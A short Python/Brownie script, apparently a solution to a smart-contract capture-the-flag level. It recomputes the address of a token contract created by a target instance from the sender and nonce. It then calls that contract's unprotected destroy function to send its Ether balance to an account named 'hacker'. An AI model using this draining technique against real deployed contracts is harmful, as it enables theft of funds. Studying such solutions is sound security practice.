# Import necessary modules
import rlp
from eth_utils import keccak, to_checksum_address, to_bytes
from brownie import accounts, config, web3, interface

# Define function to generate contract address
def mk_contract_address(sender: str, nonce: int) -> str:
    """Create a contract address using eth-utils.
    # https://ethereum.stackexchange.com/a/761/620
    """
    # Convert sender address to bytes
    sender_bytes = to_bytes(hexstr=sender)
    # Encode sender address and nonce using RLP
    raw = rlp.encode([sender_bytes, nonce])
    # Hash the RLP-encoded data using keccak-256
    h = keccak(raw)
    # Extract the last 20 bytes of the hash to get the contract address
    address_bytes = h[12:]
    # Convert the address bytes to a checksummed Ethereum address and return it
    return to_checksum_address(address_bytes)

# Define main function
def main():
    # Instance Address
    target = '0x565BFB50F979A60AE85100dbd5c54D72932309FA'
    # Create a new account using the private key stored in the config file
    hacker = accounts.add(config['wallets']['from_key'])
    # Generate the contract address for the simple token contract (created at the second transaction from target contract)
    simple_token = mk_contract_address(target, 1)
    # Print the name of the simple token (stored at storage slot 0 of the contract)
    print(f'Name: {web3.eth.get_storage_at(simple_token, 0)}')
    # Print the initial balance of the simple token
    print(f'Initial balance: {web3.eth.getBalance(simple_token)}')
    # Create an interface to interact with the simple token contract
    simple = interface.SimpleTokenInterface(simple_token)
    # Destroy the simple token by transferring its entire balance to the hacker's account
    simple.destroy(hacker, {'from': hacker})
    # Print the final balance of the simple token
    print(f'Final balance: {web3.eth.getBalance(simple_token)}')
